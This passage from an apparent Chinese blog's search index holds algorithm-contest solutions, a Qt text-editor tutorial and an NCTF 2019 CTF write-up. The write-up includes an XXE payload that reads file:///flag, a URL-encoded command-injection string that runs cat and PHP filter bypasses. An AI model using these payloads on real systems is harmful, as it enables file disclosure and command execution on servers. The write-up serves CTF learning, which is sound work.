在字符串的“花园”里迷路了，决定也去研究字符串问题。 她想到了这样一个问题： 对于一个 $“01”$ 串而言，每次操作可以把 $0$ 字符改为 $1$ 字符，或者把 $1$ 字符改为 $0$ 字符。 所谓 $“01”$ 串，即只含字符 $0$ 和字符 $1$ 的字符串。 $nozomi$ 有最多 $k$ 次操作的机会。 她想在操作之后找出一个尽可能长的连续子串，这个子串上的所有字符都相同。 $nozomi$ 想问问聪明的你，这个子串的长度最大值是多少？ 注： $k$ 次操作机会可以不全部用完。 如果想知道连续子串的说明，可以去问问 $eli,nozomi$ 不想再讲一遍。 输入描述:第一行输入两个正整数 $n$ 和 $k$ 输入仅有一行，为一个长度为$n$的、仅由字符 $0$ 和 $1$ 组成的字符串。 输出描述:一个正整数，为满足条件的子串长度最大值。 示例1输入125 110101 输出13 说明123只有 1 次操作机会。将第二个位置的 0 改成 1 ,字符串变成&quot;11101&quot;,可以选出“111”子串,长度为3。如果修改第三个或者第四个位置的字符也可以选出长度为3的子串。 题解题意原题 思路类似滑动窗口 代码1234567891011121314151617181920212223242526272829#include&lt;bits/stdc++.h&gt;using namespace std;char c[200010];int n, m;int main()&#123; scanf("%d%d", &amp;n, &amp;m); for(int i=0;i&lt;n;i++) scanf("%c", &amp;c[i]); int maxl=0, l=0, r=0, an=0, bn=0; while(r&lt;=n)&#123; if(c[r]=='0') an++; else bn++; if(an&lt;=m||bn&lt;=m)&#123; r++; &#125;else&#123; if((r-l)&gt;maxl) maxl=r-l; if(c[l]=='0')&#123; l++; an--; &#125;else&#123; l++; bn--; &#125; r++; &#125; &#125; if((r-l)&gt;maxl) maxl=r-l; printf("%d", maxl); return 0;&#125; I - nico和niconiconi题目描述 “にっこにっこにー” ——nico $nico$平时最喜欢说的口头禅是$niconi~$。 有一天$nico$在逛著名弹幕网站$”niconico”$的时候惊异的发现，$n$站上居然有很多她的鬼畜视频。 其中有一个名为《让$nico$为你洗脑》的视频吸引了她的注意。 她点进去一看，就被洗脑了: $”niconicoh0niconico*^vvniconicoG(vniconiconiconiconiconicoG(vniconico……”$ 弹幕中刚开始有很多$“nico \times 1 nico \times 2”$等计数菌，但到后面基本上都是“计数菌阵亡”的弹幕了。 nico也想当一回计数菌。她认为：$”nico”$ 计 $a$ 分，$”niconi”$ 计 $b$ 分，$”niconiconi”$ 计 $c$ 分。 她拿到了一个长度为 $n$ 的字符串，请帮她算出最大计数分数。 注：已被计数过的字符不能重复计数！如$”niconico”$要么当作$”nico”+”nico”$计 $2a$ 分，要么当作$”niconi”+”co”$计 $b$ 分。 输入描述:第一行四个正整数$n,a,b,c$ 。 $(1\leq n \leq 300000, 1\leq a,b,c \leq 10^{19})$第二行是一个长度为 $n$ 的字符串。 输出描述:一个整数，代表最大的计数分数。 示例1输入1219 1 2 5niconiconiconiconi~ 输出17 说明12&quot;niconi&quot;co&quot;niconiconi&quot;~故为2+5=7分 题解题意计数菌死的很惨 思路如下代码 代码123456789101112131415161718192021222324#include &lt;bits/stdc++.h&gt;using namespace std;#define N 300010#define ll long longll n, a, b, c;char s[N];ll f[N];bool check(int x, int len) &#123; char sc[12] = "aniconiconi"; for (int i = 1; i &lt;= len; i++) if (s[x + i] != sc[i]) return false; return true;&#125;int main() &#123; scanf("%lld%lld%lld%lld%s", &amp;n, &amp;a, &amp;b, &amp;c, s + 1); for (int i = 1; i &lt;= n; i++) &#123; if (i &gt;= 4 &amp;&amp; check(i - 4, 4)) f[i] = max(f[i], f[i - 4] + a); if (i &gt;= 6 &amp;&amp; check(i - 6, 6)) f[i] = max(f[i], f[i - 6] + b); if (i &gt;= 10 &amp;&amp; check(i - 10, 10)) f[i] = max(f[i], f[i - 10] + c); f[i] = max(f[i], f[i - 1]); //继承下去 &#125; printf("%lld\n", f[n]); return 0;&#125; J - u’s的影响力题目描述μ’s在九人齐心协力下，影响力越来越大了！ 已知第一天影响力为 $x$ ，第二天影响力为 $y$ ，从第三天开始，每一天的影响力为前两天影响力乘上 $a$ 的 $b$ 次方。 用数学语言描述是： 设第 $i$ 天的影响力为 $f(i)$ ，那么 $f(1)=x$ ，$f(2)=y$，对于 $3 \leq i$ ，$f(i)=f(i-1) \times f(i-2) \times a^b $ 她们想知道第 $n$ 天影响力是多少？ 由于这个数可能非常大，只需要输出其对 $1000000007$ 取模的值就可以了。 输入描述:一行五个正整数：$n,x,y,a,b$。 $(1\leq n,x,y,a,b \leq 10^{12})$ 输出描述:第$n$天的影响力对 $1000000007$ 取模的值。 示例1输入14 2 3 2 1 输出172 说明1f(1)=2，f(2)=3，f(3)=f(1)*f(2)*2=12，f(4)=f(2)*f(3)*2=72 题解题意推公式 思路$f(1) = x,f(2)=y$ $f(3)=xya^b$ $f(4)=xy^2a^{2b}$ $f(5)=x^2y^3a^{4b}$ $f(6)=x^{3}y^{5}a^{7b}$ $f(7)=x^{5}y^{8}a^{12b}$ 直接观察可以看出从第三项开始： $x$的变化趋势是$1,1,2,3,5$ $y$的变化趋势是$1,2,3,5,8$ 是很明显的斐波那契数列，用矩阵快速幂处理。 $a$的幂就是前两项的幂加$1$ 1234//n从0开始,对幂来说满足以下公式f[n] = f[n-1] + f[n-2] ,f[0] = 1,f[1] = 0;//xf[n] = f[n-1] + f[n-2] ,f[0] = 0,f[1] = 1;//yf[n] = f[n-1] + f[n-2] + b , f[0] = 0,f[1] = 0;//a 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;#define mod 1000000007struct matrix&#123; ll x[3][3]; matrix() &#123; memset(x, 0, sizeof(x)); &#125;&#125;;matrix multi(matrix a, matrix b, int matrixN) //矩阵相乘&#123; matrix temp; for (int i = 0; i &lt; matrixN; i++) for (int j = 0; j &lt; matrixN; j++) for (int k = 0; k &lt; matrixN; k++) &#123; temp.x[i][j] += (a.x[i][k] * b.x[k][j] % (mod - 1)); //mod-1:费马小定理 temp.x[i][j] %= (mod - 1); &#125; return temp;&#125;matrix quick_multi(matrix a, ll n, int matrixN) //矩阵快速幂&#123; matrix temp = a; n--; while (n) &#123; if (n &amp; 1) //处理奇数 temp = multi(temp, a, matrixN); a = multi(a, a, matrixN); n &gt;&gt;= 1; &#125; return temp;&#125;ll qpow(ll a, ll b) //a^b&#123; if (b == 0) return 1; a %= mod; ll ans = 1, temp = a; while (b) &#123; if (b &amp; 1) ans = (ans * temp) % mod; temp = (temp * temp) % mod; b &gt;&gt;= 1; &#125; return ans % mod;&#125;int main()&#123; ll n, x, y, a, b; cin &gt;&gt; n &gt;&gt; x &gt;&gt; y &gt;&gt; a &gt;&gt; b; n--; //从0开始 if (n == 0) cout &lt;&lt; x % mod &lt;&lt; endl; else if (n == 1) cout &lt;&lt; y % mod &lt;&lt; endl; //特判一下底数为0 else if (x % mod == 0 || y % mod == 0 || a % mod == 0) cout &lt;&lt; 0 &lt;&lt; endl; else &#123; //斐波那契 matrix ans; ans.x[0][0] = ans.x[0][1] = ans.x[1][0] = 1; //初始矩阵 ans = quick_multi(ans, n - 1, 2); matrix tmp, tmp2; //x的幂 tmp.x[1][0] = 1; tmp = multi(ans, tmp, 2); //y的幂 tmp2.x[0][0] = 1; tmp2 = multi(ans, tmp2, 2); //a的幂 memset(ans.x, 0, sizeof(ans.x)); ans.x[0][0] = ans.x[0][1] = ans.x[0][2] = ans.x[1][0] = ans.x[2][2] = 1; ans = quick_multi(ans, n - 2, 3); matrix tmp3; tmp3.x[0][0] = tmp3.x[2][0] = b % (mod - 1); tmp3 = multi(ans, tmp3, 3); //快速幂计算 ll res = qpow(x, tmp.x[0][0] % (mod - 1)); res = res * ((qpow(y, tmp2.x[0][0] % (mod - 1))) % mod) % mod; res = res * ((qpow(a, tmp3.x[0][0] % (mod - 1))) % mod) % mod; cout &lt;&lt; res &lt;&lt; endl; &#125; return 0;&#125;]]></content>
      <categories>
        <category>Algorithm Contest</category>
      </categories>
      <tags>
        <tag>NowCoder</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qtxt]]></title>
    <url>%2Fposts%2FQtxt%2F</url>
    <content type="text"><![CDATA[可以借助这个，熟悉Qt的操作 参考资料豆子博客 https://blog.51cto.com/devbean Qt开源社区 http://www.qter.org/ 新建项目新建Qt Widgets Application应用，项目名称为myMainWindow，基类选择QMainWindow，类名为MainWindow。(实际上就是一直点确定) 新建完项目后，检查一下自己的配置 ​ 如果这里显示如上，就点进去 ​ 然后都选上吧 可能会出现这种情况 ​ 稍等一下就行 初试UI创建完项目后，打开mainwindow.ui文件进入设计模式。在这里可以看到界面左上角的“在这里输入”，我们可以在这里添加菜单。双击“在这里输入”，将其更改为“文件(&amp;F)”，然后按下回车键，效果如下图所示。这里的&amp;F表明将菜单的快捷键设置为了Alt+ F，可以看到，实际的显示效果中&amp;符号是隐藏的。 ​ 同样的方法，我们在文件菜单中添加“新建(&amp;N)”子菜单，效果如下图所示。菜单后面的那个加号图标是用来创建下一级菜单的。 ​ 添加图标没有图标，就没有灵魂 认识ActionQt中的一个菜单被看做是一个Action，我们在下面的Action编辑器中可以看到刚才添加的“新建”菜单。 ​ 双击该条目，会弹出编辑动作对话框。 在编辑动作对话框中的图标后面的 黑色箭头下拉框可以选择资源。 添加资源文件我们向项目中添加新文件 鼠标右键它就行 模板选择Qt Resource File，如下图所示，名称设置为myResources。 创建完文件后会自动打开该资源文件，这里需要先在下面添加前缀，就是点击添加按钮，然后选择前缀，默认的前缀是/new/prefix1，这个可以随意修改（不要出现中文字符），我修改的是/MyIcon。 然后再按下添加按钮来添加文件，这里先将所有要用到的图片放到项目目录中。 比如我们这里在项目目录中新建了一个Icon文件夹，然后将需要的图标文件粘贴进去。 搞完这个文件夹以后，点添加，然后点文件，找到路径后全选确定就行，添加完文件后，如下图所示。 当添加完资源后，一定要按下Ctrl + S来保存资源文件，不然在后面可能无法显示已经添加的资源。 以上图片资源我都放在群里了。 使用资源文件我们重新到设计模式打开新建菜单的编辑动作对话框，然后添加图标。 我们点击这里需要的新建图标filenew.png，按下确定即可。 现在按下Ctrl + R键运行程序，看看效果。 没有好康的，就没有灵魂 完善UI菜单以及文本编译部分 最终效果 布局管理器拖入一个文本编辑器Text Edit部件。如下图所示。 然后我们在界面上点击鼠标右键，选择布局→栅格布局（或者使用快捷键Ctrl+G）。 这时整个文本编辑器部件就会填充中央区域。 现在运行程序，可以发现，无论怎样拉伸窗口，文本编辑器总是填充整个中央区域。 实现功能从这里开始，会有一点代码部分 中文字符先在main.cpp文件中添加代码来保证代码中可以使用中文字符。 首先添加#include &lt;QTextCodec&gt;头文件包含，然后在主函数中添加如下代码： 1QTextCodec::setCodecForLocale(QTextCodec::codecForName("UTF8")); 基础功能实现在mainwindow.h文件中添加public函数声明： 12345void newFile(); // 新建操作bool maybeSave(); // 判断是否需要保存bool save(); // 保存操作bool saveAs(); // 另存为操作bool saveFile(const QString &amp;fileName); // 保存文件 这里的几个函数就是用来完成功能逻辑的，下面我们会添加它们的定义来实现相应的功能。因为这几个功能联系紧密，所以这几个函数会相互调用。 然后添加private变量定义： 1234// 为真表示文件没有保存过，为假表示文件已经被保存过了bool isUntitled;// 保存当前文件的路径QString curFile; 这里的isUntitled是一个标志，用来判断文档是否被保存过。而curFile用来保存当前打开的文件的路径。 下面到mainwindow.cpp文件，先添加头文件： 1234#include &lt;QMessageBox&gt;#include &lt;QPushButton&gt;#include &lt;QFileDialog&gt;#include &lt;QTextStream&gt; 下面添加那几个函数的定义。 新建操作： 12345678910void MainWindow::newFile()&#123; if (maybeSave()) &#123; isUntitled = true; curFile = tr("未命名.txt"); setWindowTitle(curFile); ui-&gt;textEdit-&gt;clear(); ui-&gt;textEdit-&gt;setVisible(true); &#125;&#125; 这里先使用maybeSave()来判断文档是否需要保存，如果已经保存完了，则新建文档，并进行初始化。下面是maybeSave()函数的定义： 1234567891011121314151617181920212223bool MainWindow::maybeSave()&#123; // 如果文档被更改了 if (ui-&gt;textEdit-&gt;document()-&gt;isModified()) &#123; // 自定义一个警告对话框 QMessageBox box; box.setWindowTitle(tr("警告")); box.setIcon(QMessageBox::Warning); box.setText(curFile + tr(" 尚未保存，是否保存？")); QPushButton *yesBtn = box.addButton(tr("是(&amp;Y)"), QMessageBox::YesRole); box.addButton(tr("否(&amp;N)"), QMessageBox::NoRole); QPushButton *cancelBut = box.addButton(tr("取消"), QMessageBox::RejectRole); box.exec(); if (box.clickedButton() == yesBtn) return save(); else if (box.clickedButton() == cancelBut) return false; &#125; // 如果文档没有被更改，则直接返回true return true;&#125; 这里先使用了isModified()来判断文档是否被更改了，如果被更改了，则弹出对话框让用户选择是否进行保存，或者取消操作。如果取消操作，那么就返回false，什么都不执行。下面是save()函数的定义： 12345678bool MainWindow::save()&#123; if (isUntitled) &#123; return saveAs(); &#125; else &#123; return saveFile(curFile); &#125;&#125; 这里如果文档以前没有保存过，那么执行另存为操作saveAs()，如果已经保存过，那么调用saveFile()执行文件保存操作。下面是saveAs()函数的定义： 1234567bool MainWindow::saveAs()&#123; QString fileName = QFileDialog::getSaveFileName(this, tr("另存为"),curFile); if (fileName.isEmpty()) return false; return saveFile(fileName);&#125; 这里使用QFileDialog来实现了一个另存为对话框，并且获取了文件的路径，然后使用文件路径来保存文件。下面是saveFile()函数的定义： 123456789101112131415161718192021222324bool MainWindow::saveFile(const QString &amp;fileName)&#123; QFile file(fileName); if (!file.open(QFile::WriteOnly | QFile::Text)) &#123; // %1和%2分别对应后面arg两个参数，/n起换行的作用 QMessageBox::warning(this, tr("多文档编辑器"), tr("无法写入文件 %1：/n %2") .arg(fileName).arg(file.errorString())); return false; &#125; QTextStream out(&amp;file); // 鼠标指针变为等待状态 QApplication::setOverrideCursor(Qt::WaitCursor); out &lt;&lt; ui-&gt;textEdit-&gt;toPlainText(); // 鼠标指针恢复原来的状态 QApplication::restoreOverrideCursor(); isUntitled = false; // 获得文件的标准路径 curFile = QFileInfo(fileName).canonicalFilePath(); setWindowTitle(curFile); return true;&#125; 如果不明白，就把鼠标放到不懂的上面然后按F1 双击mainwindow.ui文件，在图形界面窗口下面的Action编辑器里 我们鼠标右击“新建”菜单一条，选择“转到槽”，然后选择triggered()，另外两个同理。最终代码如下： 1234567891011121314void MainWindow::on_action_N_triggered()&#123; newFile();&#125;void MainWindow::on_action_S_triggered()&#123; save();&#125;void MainWindow::on_action_A_triggered()&#123; saveAs();&#125; 现在运行程序，已经能够实现新建文件，保存文件，文件另存为的功能了。 实现其他功能先到mainwindow.h文件中添加public函数声明： 1bool loadFile(const QString &amp;fileName); // 加载文件 然后到mainwindow.cpp文件中添加该函数的定义： 123456789101112131415161718192021bool MainWindow::loadFile(const QString &amp;fileName)&#123; QFile file(fileName); // 新建QFile对象 if (!file.open(QFile::ReadOnly | QFile::Text)) &#123; QMessageBox::warning(this, tr("多文档编辑器"),tr("无法读取文件 %1:\n%2.").arg(fileName).arg(file.errorString())); return false; // 只读方式打开文件，出错则提示，并返回false &#125; QTextStream in(&amp;file); // 新建文本流对象 QApplication::setOverrideCursor(Qt::WaitCursor); // 读取文件的全部文本内容，并添加到编辑器中 ui-&gt;textEdit-&gt;setPlainText(in.readAll()); QApplication::restoreOverrideCursor(); // 设置当前文件 curFile = QFileInfo(fileName).canonicalFilePath(); setWindowTitle(curFile); return true;&#125; 分别进入其他几个动作的触发信号的槽，更改如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void MainWindow::on_action_O_triggered()&#123; if (maybeSave()) &#123; QString fileName = QFileDialog::getOpenFileName(this); if (!fileName.isEmpty()) &#123; // 如果文件名不为空，则加载文件 loadFile(fileName); ui-&gt;textEdit-&gt;setVisible(true); &#125; &#125;&#125;void MainWindow::on_action_C_triggered()&#123; if (maybeSave()) &#123; ui-&gt;textEdit-&gt;setVisible(false); &#125;&#125;void MainWindow::on_action_X_triggered()&#123; // 先执行关闭操作，再退出程序 // qApp是指向应用程序的全局指针 on_action_C_triggered(); qApp-&gt;quit();&#125;void MainWindow::on_action_Z_triggered()&#123; ui-&gt;textEdit-&gt;undo();&#125;void MainWindow::on_action_X_3_triggered()&#123; ui-&gt;textEdit-&gt;cut();&#125;void MainWindow::on_action_C_2_triggered()&#123; ui-&gt;textEdit-&gt;copy();&#125;void MainWindow::on_action_V_triggered()&#123; ui-&gt;textEdit-&gt;paste();&#125; 这里可以看到，复制、粘贴等常用功能是QTextEdit已经实现的，我们只需要调用相应的函数。虽然实现了退出功能，但是，有时候会使用窗口标题栏的关闭按钮来关闭程序，这里我们需要使用关闭事件处理函数来实现相应的功能。 下面到mainwindow.h文件中，先添加头文件包含#include&lt;QCloseEvent&gt;，然后添加函数声明： 12protected: void closeEvent(QCloseEvent *event); // 关闭事件 然后到mainwindow.cpp文件中添加该函数的定义： 123456789void MainWindow::closeEvent(QCloseEvent *event)&#123; // 如果maybeSave()函数返回true，则关闭程序 if (maybeSave()) &#123; event-&gt;accept(); &#125; else &#123; // 否则忽略该事件 event-&gt;ignore(); &#125;&#125; 查找功能函数声明首先到mainwindow.h文件中添加类的前置声明： 12class QLineEdit;class QDialog; 前置声明所在的位置跟头文件包含的位置相同。 然后在private中添加对象定义： 12QLineEdit *findLineEdit;QDialog *findDlg; 添加一个私有槽声明： 12private slots: void showFindText(); 槽可以看做是一个函数，只不过可以和信号进行关联。 下面到mainwindow.cpp文件中，因为前面在头文件中使用了类的前置声明，所以这里需要先添加头文件包含： 12#include &lt;QLineEdit&gt;#include &lt;QDialog&gt; 然后在构造函数中进行初始化操作，即添加如下代码： 12345678findDlg = new QDialog(this);findDlg-&gt;setWindowTitle(tr("查找"));findLineEdit = new QLineEdit(findDlg);QPushButton *btn= new QPushButton(tr("查找下一个"), findDlg);QVBoxLayout *layout= new QVBoxLayout(findDlg);layout-&gt;addWidget(findLineEdit);layout-&gt;addWidget(btn);connect(btn, SIGNAL(clicked()), this, SLOT(showFindText())); 这里创建了一个对话框，然后将一个行编辑器和一个按钮放到了上面，并使用布局管理器进行布局。 最后将按钮的单击信号关联到了自定义的显示查找到的文本槽上。 实现功能在mainwindow.cpp中 12345void MainWindow::showFindText()&#123; QString str = findLineEdit-&gt;text(); ui-&gt;textEdit-&gt;find(str, QTextDocument::FindBackward);//这行等会换一下&#125; 这时已经能实现查找的功能了。 但是find的返回值类型是bool型，而且，我们也应该为查找不到字符串作出提示。（怎么看，按F1） 将这行代码更改为： 12345if (!ui-&gt;textEdit-&gt;find(str, QTextDocument::FindBackward))&#123; QMessageBox::warning(this, tr("查找"), tr("找不到%1").arg(str));&#125; 最后，我们来实现界面上的查找功能。从设计模式进入查找动作的触发信号的槽，更改如下： 1234void MainWindow::on_action_F_triggered()&#123; findDlg-&gt;show();&#125;]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019_NCTF_WriteUp]]></title>
    <url>%2Fposts%2F2019_NCTF_WriteUp%2F</url>
    <content type="text"><![CDATA[边打边学，真的学了不少东西，那就总结整理一下吧 Webeasyphpsolver:Yiayaz前两个很简单，第一天卡在第三个，第二天谷歌出来了 第一个：在23333后面加个%0a， 23333%0a 第二个：这个md5碰撞和之前的中科大的校赛有点像 它意思很明确，str1必须是数字，md5一开始不相同，str2把c换成0后要相同，python找一下 str1=240610708&amp;str2=axN54 第三个：不给_，那就q.w.q呀，开头不给ls，然后还不给超过8个，不给直接cat，那就c’a’t’空格f*， 转一下输入再按F12就行 q.w.q=c%27a%27t%20f* 不得不说这题让我学了好多东西，这题我爱了。 flasksolver:Yiayaz查看源码后发现会检查是否包含flag，于是通配符or字符拼接 Flask（Jinja2） 服务端模板注入漏洞(SSTI) Fake XML cookbooksolver:0xfaner1234567891011121314151617181920212223var data = '&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM "file:///flag"&gt;]&gt;' + "&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;ss&lt;/password&gt;&lt;/user&gt;";$.ajax(&#123; type: "POST", url: "doLogin.php", contentType: "application/xml;charset=utf-8", data: data, dataType: "xml", anysc: false, success: function(result) &#123; var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue; if (code == "0") &#123; $(".msg").text(msg + " login fail!"); &#125; else if (code == "1") &#123; $(".msg").text(msg + " login success!"); &#125; else &#123; $(".msg").text("error:" + msg); &#125; &#125;, error: function(XMLHttpRequest, textStatus, errorThrown) &#123; $(".msg").text(errorThrown + ':' + textStatus); &#125;&#125;); 分析网站源码，可以看出该网站可以XML注入，而且可以回显，那么直接利用现成的ajax代码改一下报文即可。 ReDEBUGsolver:Yiayaz尝试在各个地方设置断点，虚拟机 16.04丝般顺滑 远程调试 签到题solver:Yiayaz高斯消元acm板子啊 找到的那一大串本来是准备一个个手敲的，但是写了几个以后发现它每七个一循环，那就七个七个来呗 Pwnhello_pwnsolver:Yiayazremote连上去 CryptoKeyboardsolver:Yiayaz键盘上面字母对应的数字，然后拿出手机对着九键看出来 （实际上是谷歌了八个字母能干啥，然后就有说如果是连起来的是九键就试试惹，没想到。。。） Soresolver:YiayazVigenere，丢进CAP，找出长度23，然后低频后解出密钥，直接交了一发密钥wa了，用CAP反解出Vigenre明文，明文大小写，修改密钥大小写。 Misca_good_ideasolver:Yiayaz下载图片，改成rar，然后7zip打开，两张图（to.png，to_do.png），stegsolve开启，Image Combiner点击，找到二维码，扫就完事 Become a Rockstarsolver:Yiayaz下载下来是一首优美的歌 ？心态炸裂 ，然后看到NCTF{就很兴奋，文末还说不是程序，那就是文本阅读题呗 Say Problem Makers Put Problem Makers with Alice into Problem Makers with Bob Alice says you Bob says ar Shout RSA Put Ron Rivest with Adi Shamir with Leonard Adleman into RSA Ron Rivest says nice Adi Shamir says rock Leonard Adleman says star 五个人says后面连起来很通顺，嗯，那肯定是惹（这脑洞真的） pip installsolver:Yiayazpip install —user nctf-2019-instal 后有个链接，点进去下载后找到setup.py这个文件，里面有个一看就觉得不大对劲的字符串，那我就不客气了，在线网站你懂的 不是涩琪 Bright Body Isolver:Yiayaz打开游戏先去左边拿装备，按u装备，然后瞎玩。一次性把蓝打空，就差不多把敌人打死，有时候会留一点血，然后黑魂玩家无敌（我超勇的）。先手在敌人仇恨范围外打就行，打完就有flag。 2077solver:Yiayaz点开发现是官方的视频（论梯子的重要性），所以不是中科大校赛那题的解法（？我寻思主办方没有2077的员工把）。那就社工题呗，google 一下stream code 2077，网站上写的很清楚他们从视频里找出了图片，然后下载图片，最后图片sha256就出来了。 小狗的秘密solver:Yiayaz、0xfaner先谷歌了一下什么是pcapng文件，然后下载大黑阔用的Wireshark，打开文件，去找奇奇怪怪的包，最后找到一个http的导出后，是1.html，打开看到三维点阵，谷歌一下就是发现是RGB，但是当时在外面，就直接丢给队友。 队友道：得到了像素信息使用PIL库写入像素点画图片即可 12345678910111213141516#!/usr/bin/python# -*- coding:utf8 -from PIL import Imagex = 50 #x坐标 通过对txt里的行数进行整数分解y = 2700 #y坐标 x*y=行数 13500行，150和900也可以# 长宽改一下就行 100 50im = Image.new("RGB", (x, y))file = open('basic.txt') for i in range(0, x): for j in range(0, y): line = file.readline().replace('(','').replace(')','') #获取一行rgb值，并且把()都替换为空 rgb = line.split(",") #逗号分割 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) #（i,j）为坐标，后面的是像素点 im.save("flag.png") 原文链接 OtherNCTF2019问卷调查solver:Yiayaz这场比赛学到了很多东西，就是挺伤身体的，可能是因为我太菜了把，祝NCTF越办越好]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello Hexo]]></title>
    <url>%2Fposts%2Fhello-hexo%2F</url>
    <content type="text"><![CDATA[Hello, Hexo. On a starry night, I met Hexo and started an interesting journey Witness my growth, Hexo!]]></content>
      <categories>
        <category>Trivial</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
